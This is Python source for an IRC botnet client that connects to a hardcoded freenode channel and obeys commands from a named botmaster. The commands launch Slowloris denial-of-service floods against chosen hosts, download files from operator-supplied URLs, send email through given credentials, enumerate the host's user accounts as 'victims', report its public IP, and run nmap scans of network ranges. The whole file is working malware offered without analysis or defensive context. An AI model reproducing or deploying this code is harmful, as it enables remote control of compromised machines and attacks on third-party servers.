def send_email(sender, password, recipient, subject, message):
    from smtplib import SMTP
    server = SMTP("smtp.gmail.com:587")
    server.ehlo()
    server.starttls()
    server.login(sender, password)
    msg = "\r\n".join(["From: " + sender, "To: " + recipient, "Subject: " + subject, "", message])
    server.sendmail(sender, recipient, msg)
    server.quit()
import socket, random, time, random, ssl
list_of_sockets = []
user_agents = ["Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"]
def init_socket(ip, port, https, randuseragent):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    if https:
        s = ssl.wrap_socket(s)
    s.connect((ip, port))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    if randuseragent:
        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s
def slowloris(host, sport, randuseragent, https, sockets):
    ip = host
    port = int(sport)
    https = "TRUE" in https.upper()
    socket_count = int(sockets)
    for _ in range(socket_count):
        try:
            s = init_socket(ip, port, https, randuseragent)
        except socket.error:
            break
        list_of_sockets.append(s)
    while True:
        for s in list(list_of_sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)
        for _ in range(socket_count - len(list_of_sockets)):
            try:
                s = init_socket(ip, port, https, randuseragent)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                break
        time.sleep(15)
def main():
    import socket
    irc = 'irc.freenode.net'
    botmasters = ["tjgerot"]
    port = 6667
    botid = 0
    channel = '##qdmdrqtvd'
    chanpass = "helloworldasdf"
    sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sck.connect((irc, port))
    def post(msg, chat = False):
        if chat is True:
            if "\r\n" in msg:
                lines = msg.split("\r\n")
                for line in lines:
                    sck.send(("PRIVMSG " + channel + " :" + line + "\r\n").encode("UTF8"))
                    time.sleep(2)
            else:
                packet = "PRIVMSG " + channel + " :" + msg + "\r\n"
                sck.send(packet.encode("UTF8"))
        else:
            sck.send((msg + "\r\n").encode("UTF8"))
    data = ''
    registered = False
    motd = False
    joined = False
    victims = []
    named = False
    network = []
    global opsys
    opsys = ""
    class Host:
        def __init__(self, ip):
            self.ip = ip
            self.protocols = []
            self.ports = []
    def interpretCommands(command):
        if "KILL" in command.split()[0].upper():
            post("WILCO", True)
            if "VERBOSE" in command.split()[-1].upper():
                post("Goodbye World!", True)
                exit(0)
            else:
                exit(0)
        elif "HELP" in command.split()[0].upper():
            post("COMMAND EMAIL [SENDER, PASSWORD, RECIPIENT, SUBJECT, MESSAGE]\r\n  > COMMAND EMAIL myemail@gmail.com mypass123 targetemail@host.com Hello! this-is-my-message\r\nKILL [*VERBOSE]\r\n  > COMMAND KILL\r\n  > COMMAND KILL VERBOSE\r\nDETECT-OS [*VERBOSE]\r\n  > COMMAND DETECT-OS\r\n  > COMMAND DETECT-OS VERBOSE\r\nRECONNECT [*VERBOSE]\r\n  > COMMAND RECONNECT\r\n  > COMMAND RECONNECT VERBOSE\r\nDOWNLOAD [URL, FILENAME, *VERBOSE]\r\n  > COMMAND DOWNLOAD http://example.org/test.txt test.txt\r\n  > COMMAND DOWNLOAD http://example.org/test.txt test.txt VERBOSE\r\nSLOWLORIS [HOST, PORT, RANDOM_UA, HTTPS, SOCKETS, *VERBOSE]\r\n  > COMMAND SLOWLORIS example.org 80 TRUE FALSE 50\r\n  > COMMAND SLOWLORIS example.org 80 TRUE FALSE 50 VERBOSE\r\nSCAN-RANGE [START_IP, FINISH_IP, START_PORT, FINISH_PORT, *VERBOSE]\r\n  > COMMAND SCAN-RANGE 192.168.0.100 192.168.0.112 11 1000\r\n  > COMMAND SCAN-RANGE 192.168.0.100 192.168.0.112 11 1000 VERBOSE\r\nSCAN [IP, START_PORT, FINISH_PORT, *VERBOSE]\r\n  > COMMAND SCAN 192.168.0.112 11 1000\r\n  > COMMAND SCAN 192.168.0.112 11 1000 VERBOSE", True)
        elif "DETECT-OS" in command.split()[0].upper():
            from platform import uname
            d = uname()
            opsys = "%s %s %s: %s %s [%s]" % (d.system, d.release, d.version, d.machine, d.processor, d.node)
            if "VERBOSE" in command.split()[-1].upper():
                post("OS: " + opsys, True)
            from os import listdir
            if "Windows" in opsys:
                vics = listdir("C:/Users")
                for a in vics:
                    if "." not in a and "Default" not in a and a != "Public" and a != "All Users":
                        victims.append(a)
            elif "Linux" in opsys:
                for victim in listdir("/home"):
                    victims.append(victim)
            if "VERBOSE" in command.split()[-1].upper():
                vs = ""
                for vic in victims:
                    vs += vic + ","
                    post("Victims: " + vs[:-1], True)
        elif "RECONNECT" in command.split()[0].upper():
            if "VERBOSE" in command.split()[-1].upper():
                post("Reconnecting.", True)
            return False
        elif "DOWNLOAD" in command.split()[0].upper():
            if "VERBOSE" in command.split()[-1].upper():
                post("Downloading", True)
            from urllib.request import urlretrieve
            urlretrieve(command.split()[1], command.split()[2])
            if "VERBOSE" in command.split()[-1].upper():
                post("Download complete.", True)
        elif "EMAIL" in command.split()[0].upper():
            send_email(command.split()[1], command.split()[2], command.split()[3], command.split()[4], command.split()[5])
        elif "REPORT-IP" in command.split()[0].upper():
            from requests import get as geturl
            post(geturl("http://api.ipify.org/").text, True)
        elif "SLOWLORIS" in command.split()[0].upper():
            slowloris(command.split()[1], command.split()[2], command.split()[3], command.split()[4], command.split()[5])
        elif "SCAN-RANGE" in command.split()[0].upper():
            post("WILCO", True)
            import nmap
            nm = nmap.PortScanner()
            start = int(command.split()[1].split(".")[-1])
            stop = int(command.split()[2].split(".")[-1])
            statements = []
            hosts = []
            for i in range(start, stop + 1):
                hostIP = command.split()[1].split(".")[0] + "." + command.split()[1].split(".")[1] + "." + command.split()[1].split(".")[2] + "." + str(i)
                print("Scanning " + hostIP)
                nm.scan(hostIP, str(command.split()[3]) + "-" + str(command.split()[4]))
                for host in nm.all_hosts():
                    h = Host(host)
                    h.hostname = nm[host].hostname()
                    h.state = "up" in nm[host].state()
                    h.protocols = nm[host].all_protocols()
                    for protocol in h.protocols:
                        h.ports.append(list(nm[host][protocol].keys()))
                    hosts.append(h)
                    network.append(h)
            for host in hosts:
                if host.state is True:
                    portlist = ""
                    print(host.ports)
                    for port in host.ports[0]:
                        portlist += str(port) + ", "
                    statements.append(host.ip + ": " + portlist[:-2])
            for statement in statements:
                if "VERBOSE" in command.split()[-1].upper():
                    post(statement, True)
                else:
                    print(statement)
        elif "SCAN" in command.split()[0].upper():
            post("WILCO", True)
            import nmap
            nm = nmap.PortScanner()
            nm.scan(command.split()[1], str(command.split()[2]) + "-" +  str(command.split()[3]))
            hosts = []
            for host in nm.all_hosts():
                h = Host(host)
                h.hostname = nm[host].hostname()
                h.state = "up" in nm[host].state()
                h.protocols = nm[host].all_protocols()
                for protocol in h.protocols:
                    h.ports.append(list(nm[host][protocol].keys()))
                hosts.append(h)
                network.append(h)
            statements = []
            for host in hosts:
                if host.state is True:
                    portlist = ""
                    for port in host.ports[0]:
                        portlist += str(port) + ", "
                    statements.append(host.ip + ": " + portlist[:-2])
            for statement in statements:
                if "VERBOSE" in command.split()[-1].upper():
                    post(statement, True)
                else:
                    print(statement)
        else:
            print("Unknown Command: " + command.split()[0])
    while True:
        data = sck.recv(1024)
        data = data.decode("UTF8")
        parts = data.split("\r\n")
        for part in parts:
            if "PING" in part:
                post("PONG " + part.split()[1])
                print("NETWORK> Playing Ping Pong")
            if "Welcome to the freenode Internet Relay Chat Network" in part:
                motd = True
            if motd is False:
                if len(part) is 0:
                    pass
                elif part.split("!")[0].replace(":", "") in botmasters:
                    if part.split("PRIVMSG")[1].replace(channel + " :", "").strip().upper().startswith("COMMAND"):
                        live = interpretCommands(part.split("PRIVMSG")[1].replace(channel + " :", "").strip().replace("COMMAND", "").replace("command", "").replace("Command", "").strip())
                        if live is False:
                            return True
                    elif "HELLO WORLD" in part.upper():
                        print("BOTMASTER> " + part.split("PRIVMSG")[1].replace(channel + " :", "").strip())
                        post("Hello Master!", True)
                    else:
                        print("BOTMASTER> " + part.split("PRIVMSG")[1].replace(channel + " :", "").strip())
                elif "NOTICE" in part:
                    print("SERVER> " + part.split("***")[1].strip())
                elif "= " + channel in part:
                    print("NAMED> " + part.split(" ")[-1].strip())
                elif "End of /NAMES list" in part:
                    named = True
                elif " MODE " or " JOIN " + channel in part:
                    pass
                else:
                    print("CHAT> " + part)
            if "End of /MOTD command" in part:
                motd = False
        if registered is False:
            nick = "bot" + str(botid)
            post("NICK " + nick)
            post("USER " + nick + " " + nick + " " + nick + " :" + nick)
            registered = True
        if joined is False:
            post("JOIN " + channel + " " + chanpass)
            joined = True
    print("#".encode("UTF8"), sck.recv(4096))
if __name__ == "__main__":
    while True:
        main()
